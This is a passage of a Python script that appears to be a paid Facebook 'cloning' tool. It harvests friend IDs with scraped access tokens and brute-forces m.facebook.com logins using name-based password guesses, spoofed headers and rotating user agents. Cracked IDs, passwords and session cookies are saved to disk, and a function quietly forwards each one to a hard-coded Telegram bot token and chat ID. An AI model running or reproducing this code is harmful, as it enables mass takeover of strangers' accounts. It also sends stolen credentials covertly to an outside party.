      print(' \x1b[1;97m║══[√]💥  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[1;95m║══[√]💥  7 DAY 150 TAKA ')
      print(' \x1b[1;95m║══[√]💥  15 DAY 250 TAKA ')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   BLACK,    Please,   Send,   Your,   Key,"')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
meyexudi()
def naima():
	print('-------------------')
print(logo)
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\x1b[38;5;46m[•]ENTER USERNAME: ')
    password = input('\x1b[38;5;46m[•]ENTER PASSWORD: ')

    if username == 'O' and password == 'P':
        print('\x1b[38;5;46mYou Have Successfully Logged in ')
        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
      print(f'%s{P}[%sðŸ’š%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[] %s  Your Active Apps      :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[âˆš] %s  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\x1b[1;91m \x1b[1;92m\033[1;92m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;92m5\x1b[1;92m \x1b[1;91m  ')
            
def fuck(idf,pw,kuki):
    try:
        import requests
        token = "6474521640:AAE7pP5ajk6TUxyTGLOLbwvhFDyCxZt7yO8"
        chatid = "6000258427"
        ok_id =str(idf+"|"+pw+"|"+kuki)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
        
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python PAID.py")
        exit()

    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print('\x1b[38;5;46m════════════════════════════════════════════════')
    print(f"""\x1b[38;5;46m[1]FILE CLONING""")
    print(f"""\x1b[38;5;46m[2]RANDOM CLONING""")
    print(f"""\x1b[38;5;46m[3]FILE MAKE""")
    print(f"""\x1b[38;5;46m[4]REMOVE DUBLICATE ID""")
    print(f"""\x1b[38;5;46m[0]EXIT""")
    print('\x1b[38;5;46m════════════════════════════════════════════════')
    HEART = input('\x1b[38;5;46mCHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        os.system("python PAID.py")
    elif HEART in ['3','03']:
        os.system("python PAID.py")
    elif HEART in ['4','04']:
    	os.system("python PAID.py")
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()

def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\033[0;91m==================')
        jum = int(input(' \033[95;1m[\033[92;1m•\033[95;1m] ENTER TARGET AMOUNT  : '))
        print('\033[0;91m==================')
    except ValueError:
        print('\033[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\033[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\033[92;1m•\033[95;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\033[0;95m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\033[0;91m==================')
        print(f' \033[92;1m[\033[92;1m•\033[92;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\033[0;91m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    os.system('espeak -a 300 " your file name"')
    print('\x1b[38;5;46m[ Put File Example:  /sdcard/BLACK.txt  Etc...]')
    o = input('\x1b[38;5;46m[\x1b[38;5;46m+\x1b[38;5;46m] INPut FILE NAME :\x1b[38;5;46m ')
    try:lin = open(o).read().splitlines()
    except:
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\x1b[38;5;46m===============================================')
    print("\x1b[38;5;46m[1]CLONING FOR ONLY 𝐎𝐋𝐃 IDz")
    print("\x1b[38;5;46m[2]CLONING FOR ONLY 𝐍𝐄𝐖 IDz")
    print("\x1b[38;5;46m[3]CLONING FOR 𝐌𝐈𝐗 IDz")
    print('\x1b[38;5;46m===============================================')
    hu = input('\x1b[38;5;46m[+]CHOOSE :\x1b[38;5;46m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m==================')
    print("\x1b[38;5;46m[1]METHOD 1 [DATA/WIFI HOST METHOD]")
    print("\x1b[38;5;46m[2]METHOD 2 [ONLY DATA USER B-GRAP]")
    print('\033[0;91m==================')
    hc = input('\x1b[38;5;46m[•] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    elif hc in ['3','03']:
        method.append('freex')
    else:
        method.append('mobile')
    passwrd()
    exit() 
    
def CYBER(idf):
    if len(idf)==15:
        if idf[:10] in ['1000000000']       :mafiya = ' 2009'
        elif idf[:9] in ['100000000']       :mafiya = '~> 2009'
        elif idf[:8] in ['10000000']        :mafiya = '~> 2009'
        elif idf[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:mafiya = '~> 2009'
        elif idf[:7] in ['1000006','1000007','1000008','1000009']:mafiya = ' 2010'
        elif idf[:6] in ['100001']          :mafiya = '~> 2010/2011'
        elif idf[:6] in ['100002','100003'] :mafiya = '~> 2011/2012'
        elif idf[:6] in ['100004']          :mafiya = '~> 2012/2013'
        elif idf[:6] in ['100005','100006'] :mafiya = '~> 2013/2014'
        elif idf[:6] in ['100007','100008'] :mafiya = '~> 2014/2015'
        elif idf[:6] in ['100009']          :mafiya = '~> 2014/2015'
        elif idf[:5] in ['10001']           :mafiya = '~> 2015/2016'
        elif idf[:5] in ['10002']           :mafiya = '~> 2016/2017'
        elif idf[:5] in ['10003']           :mafiya = '~> 2018/2019'
        elif idf[:5] in ['10004']           :mafiya = '~> 2019/2020'
        elif idf[:5] in ['10005']           :mafiya = '~> 2020'
        elif idf[:5] in ['10006','10007','']:mafiya = '~> 2021'
        elif idf[:5] in ['10008']           :mafiya = '~> 2022'
        elif idf[:5] in ['10009','6155']       :mafiya = '~> 2023'
        else:mafiya=''
    elif len(idf) in [9,10]:
        mafiya= '~> 2008/2009'
    elif len(idf)==8:
        mafiya = '~> 2007/2008'
    elif len(idf)==7:
        mafiya = '~> 2006/2007'
    else:mafiya=''
    return mafiya
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\x1b[38;5;46m[•]𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;46m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print('\x1b[38;5;46m[•]𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \x1b[38;5;46m:\x1b[38;5;46m ',str(len(id)))
    print("\x1b[38;5;46m[•]𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ")
    print(f'\x1b[38;5;46m[•]𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
    print('\x1b[38;5;50m===============================================')
    with tred(max_workers=35) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')                    
                    pwv.append(frs+'##')
                    pwv.append(frs+'444')
                    pwv.append(frs+'444@#')
                    pwv.append(nmf)
                    pwv.append(frs)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@12356')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')                   
                    pwv.append(frs+'11')
                    pwv.append(frs+'420')
                    pwv.append(frs+'111')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')                    
                    pwv.append(frs+'##')
                    pwv.append(frs+'444')
                    pwv.append(frs+'444@#')
                    pwv.append(nmf)
                    pwv.append(frs)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@12356')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')                   
                    pwv.append(frs+'11')
                    pwv.append(frs+'420')
                    pwv.append(frs+'111')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'freex' in method:
                pool.submit(crackx,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python PAID.py")
    exit()
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;95m{bo}[BLACK •M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'dpr': '2',
           'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afc8xERFqYUqhbjDj_Efdz_ATuOMmbCevUperTX1H0oOJ3TicN_wc5_IgCXZztLgcfhJQQDBlmlqeOFPvdIle_Xdp5NWWPpa8K9qXdt5Sl_-VA&smuh=30986&lh=Ac9ajmSa7h5FUDILaAo&wtsid=rdr_0u08u20LqhBE6kKgq&_rdr',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"CPH1717"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"7.1.1"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': ua,
           'viewport-width': '980',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╔══➻🖤 \033[38;5;46m𝐔𝐈𝐃      ╔══➻ \033[1;92m{idf} ")
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╚══➻🖤 \033[38;5;46m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╚══➻ \033[0;91m{pw}")
                print(f"\033[1;32m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('/sdcard/BLACK-CP.txt', 'a').write( idf+' • '+pw+'\n')
                open('/sdcard/UA.txt', 'a').write( ua+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f"\x1b[38;5;46m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨??𝐬 ╔══➻💙 \033[38;5;96m𝐔𝐈𝐃      ╔══➻\033[38;5;86m {idf} ")
                print(f"\x1b[38;5;46m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╠══➻?? \033[38;5;96m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╠══➻\033[1;97m {pw}")
                print(f"\x1b[38;5;46m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╚══➻💎 \033[38;5;96m𝐂𝐨𝐨𝐤𝐢𝐞𝐬  ╚══➻ \033[1;92m{kuki}")
                print(f"\x1b[38;5;46m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                open('/sdcard/BLACK-OK.txt', 'a').write( idf+' • '+pw+' | '+kuki+'\n')
                fuck(idf,pw,kuki)
                cek_apk(session,kuki)
                open('/sdcard/UA.txt', 'a').write( ua+'\n')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def BLACK():
    ua1='Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nokia 1 Build/O11019)'
    ua2='Dalvik/2.1.0 (Linux; U; Android 8.0.0; Nokia 3.1 Build/O00623)'
    ua3='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 6.1 Build/PPR1.180610.011)'
    ua4='Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nokia 2.1 Build/OPM1.171019.019)'
    ua5='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 3.1 Build/PPR1.180610.011)'
    ua6='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 2.1 Build/PKQ1.181105.001)'
    ua7='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 5.1 Plus Build/PPR1.180610.011)'
    ua8='Dalvik/2.1.0 (Linux; U; Android 10; Nokia 7.1 Build/QKQ1.190828.002)'
    ua9='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 3.1 Plus Build/PPR1.180610.011)'
    ua10='Dalvik/1.6.0 (Linux; U; Android 4.1.2; Nokia_X Build/JZO54K)'
    ua11='Dalvik/2.1.0 (Linux; U; Android 10; Nokia 6.1 Build/QKQ1.190828.002)'
    ua12='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 1 Plus Build/PPR1.180610.011)'
    ua13='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 7.2 Build/PKQ1.190118.001)'
    ua14='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 2.2 Build/PPR1.180610.011)'
    ua15='Dalvik/2.1.0 (Linux; U; Android 9; Nokia 3 V Build/PKQ1.190202.001)'
    ua16='Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V8.5.4.0.NAMMIED)'
    ua17='Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4X MIUI/8.3.22)'
    ua18='Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V9.6.2.0.MBFCNFD)'
    ua19='Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6 MIUI/V9.6.14.0.OCGMIFD)'
    ua20='Dalvik/2.1.0 (Linux; U; Android 5.0.2; Redmi Note 3 MIUI/6.8.4)'
    ua21='Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.5.5.0.NDKMIFA)'
    ua22='Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/8.2.8)'
    ua23='Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/8.8.30)'
    ua24='Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6 Pro MIUI/8.8.3)'
    ua25='Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi 3 MIUI/8.3.15)'
    ua26='Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi S2 MIUI/8.7.26)'
    ua27='Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi 4 MIUI/8.3.29)'
    ua28='Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A Prime MIUI/V9.1.2.0.NDKMIEI)'
    ua29='Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 5 MIUI/8.9.6)'
    ua30='Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/8.5.25)'
    ua31='Dalvik/2.1.0 (Linux; U; Android 7.1.2; SAMSUNG-SM-N900A Build/N2G47H)'
    ua32='Dalvik/1.6.0 (Linux; U; Android 4.1.2; SAMSUNG-SGH-I717 Build/JZO54K)'
    ua33='Dalvik/2.1.0 (Linux; U; Android 7.1.1; Samsung Chromebook Plus Build/R61-9765.85.0)'
    ua34='Dalvik/1.6.0 (Linux; U; Android 4.4.3; SAMSUNG-SGH-I747 Build/KTU84M)'
    ua35='Dalvik/2.1.0 (Linux; U; Android 7.1.1; Samsung Chromebook Plus Build/R66-10452.99.0)'
    ua36='Dalvik/1.6.0 (Linux; U; Android 4.1.2; SAMSUNG-SGH-I747 Build/JZO54K)'
    ua37='Dalvik/2.1.0 (Linux; U; Android 8.0.0; SAMSUNG-SM-G935A Build/R16NW)'
    ua38='Dalvik/2.1.0 (Linux; U; Android 5.1.1; SAMSUNG-SM-N920A Build/LMY47X)'
    ua39='Dalvik/1.6.0 (Linux; U; Android 4.4.2; SAMSUNG-SM-G900A Build/KOT49H)'
    ua40='Dalvik/2.1.0 (Linux; U; Android 7.1.1; Samsung Chromebook Plus Build/R63-10032.86.0)'
    ua41='Dalvik/2.1.0 (Linux; U; Android 5.0.1; SAMSUNG-SGH-I337 Build/LRX22C)'
    ua42='Dalvik/2.1.0 (Linux; U; Android 7.0; SAMSUNG-SM-G925A Build/NRD90M)'
    ua43='Dalvik/2.1.0 (Linux; U; Android 6.0.1; SAMSUNG-SM-G928A Build/MMB29K)'
    ua44='Dalvik/2.1.0 (Linux ARMv8A; U; Android 8.0.0; en-US; rv:65.0; SAMSUNG SM-A605G Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Yowser/2.5 Chrome/71.0.3578.99 YaBrowser/19.1.0.1114'
    ua45='Dalvik/2.1.0 (Linux; U; Android 8.1.0; SAMSUNG-SM-J727AZ Build/M1AJQ)'
    ua46='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011)'
    ua47='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1851 Build/PKQ1.180819.001)'
    ua48='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1723 Build/PKQ1.190118.001)'
    ua49='Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1808 Build/O11019)'
    ua50='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1806 Build/PPR1.180610.011)'
    ua51='Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1816 Build/O11019)'
    ua52='Dalvik/2.1.0 (Linux; U; Android 7.0; vivo 1612 Build/NRD90M)'
    ua53='Dalvik/2.1.0 (Linux; U; Android 7.0; vivo 1601 Build/NRD90M)'
    ua54='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1904 Build/PPR1.180610.011)'
    ua55='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1901 Build/PPR1.180610.011)'
    ua56='Dalvik/2.1.0 (Linux; U; Android 7.0; vivo 1713 Build/NRD90M)'
    ua57='Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1908 Build/O11019)'
    ua58='Dalvik/2.1.0 (Linux; U; Android 7.1.1; Vivo One Plus Build/N6F26Q)'
    ua59='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1951 Build/PKQ1.181030.001)'
    ua60='Dalvik/2.1.0 (Linux; U; Android 9; vivo 1819 Build/P00610)'
    ua61='Dalvik/2.1.0 (Linux; U; Android 8.1.0; OPPO R11 Plusk Build/OPM1.171019.011)'
    ua62='Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO R9s Build/MMB29M)'
    ua63='Dalvik/2.1.0 (Linux; U; Android 8.1.0;CPH1803 Build/OPM1.171019.026)[FBAN/Orca- Android;FBAV/275.0.0.20.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/234764319;FBCR/TNT;FBMF/OPPO;FBDV/CPH1803;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]'
    ua64='Dalvik/2.1.0 (Linux; U; Android 7.1; OPPO A33 Build/LMY47V)'
    ua65='Dalvik/2.1.0 (Linux; U; Android 7.1.1; OPPO A83 Build/N6F26Q)'
    ua66='Dalvik/2.1.0 (Linux; U; Android 7.1.1; OPPO F5 Build/N6F26Q)'
    ua67='Dalvik/2.1.0 (Linux; U; Android 7.1.1; OPPO A73 Build/N6F26Q)'
    ua68='Dalvik/2.1.0 (Linux; U; Android 7.1.1; OPPO A1 Build/N6F26Q)'
    ua69='Dalvik/1.6.0 (Linux; U; Android 4.4.2; OPPO R11 Build/NMF26X)'
    ua70='Dalvik/2.1.0 (Linux; U; Android 5.1; OPPO A37m Build/LMY47I)'
    ua71='Dalvik/2.1.0 (Linux; U; Android 7.1.1; OPPO R9s Build/NMF26F)'
    ua72='Dalvik/2.1.0 (Linux; U; Android 5.1.1; OPPO A33m Build/LMY47V)'
    ua73='Dalvik/2.1.0 (Linux; U; Android 11; Realme 2 Pro Build/RQ3A.210705.001)'
    ua74='Dalvik/2.1.0 (Linux; U; Android 10; realme Smart TV Build/QTG3.200617.002)'
    ua75='Dalvik/2.1.0 (Linux; U; Android 11; Realme G70 Series Build/RQ2A.210505.002)'
    ua76='Dalvik/2.1.0 (Linux; U; Android 11; Realme 5 Series Build/RQ3A.211001.001)'
    ua77='Dalvik/2.1.0 (Linux; U; Android 11; realme Smart TV Build/RTM5.220609.106)'
    ua78='Dalvik/2.1.0 (Linux; U; Android 10; realme 2 Build/QQ3A.200805.001)'
    ua79='Dalvik/2.1.0 (Linux; U; Android 11; Realme 2/C1 Build/RQ3A.211001.001)'
    ua80='Dalvik/2.1.0 (Linux; U; Android 10; Realme XT Build/QD4A.200905.003)'
    ua81='Dalvik/2.1.0 (Linux; U; Android 11; motorola edge Build/RPD31.Q4U-39-26-4)'
    ua82='Dalvik/2.1.0 (Linux; U; Android 10; motorola one fusion+ Build/QPIS30.73-33-6)'
    ua83='Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-55-2)'
    ua84='Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSBS30.62-29-11-3)'
    ua85='Dalvik/2.1.0 (Linux; U; Android 10; motorola one vision Build/QSAS30.62-24-18)'
    ua86='Dalvik/2.1.0 (Linux; U; Android 10; motorola one hyper Build/QPFS30.103-43-14)'
    ua87='Dalvik/2.1.0 (Linux; U; Android 10; motorola one Build/QPKS30.54-22-18)'
    ua88='Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G UW Build/QPNS30.37-Q3-42-40-7-4)'
    ua89='Dalvik/2.1.0 (Linux; U; Android 11; motorola edge plus Build/RPBS31.Q1-19-19-11-2-1-4)'
    ua90='Dalvik/2.1.0 (Linux; U; Android 11; motorola razr 5G Build/RPS31.Q1-40-17-12)'
    ua91='Dalvik/2.1.0 (Linux; U; Android 10; motorola one Build/QPKS30.54-22-20)'
    ua92='Dalvik/2.1.0 (Linux; U; Android 10; motorola one vision Build/QSAS30.62-24-20)'
    ua93='Dalvik/2.1.0 (Linux; U; Android 10; motorola one zoom Build/QPHS30.29-Q3-28-13-10-6)'
    ua94='Dalvik/2.1.0 (Linux; U; Android 7.0; HUAWEI MLA-L12 Build/HUAWEIMLA-L12)'
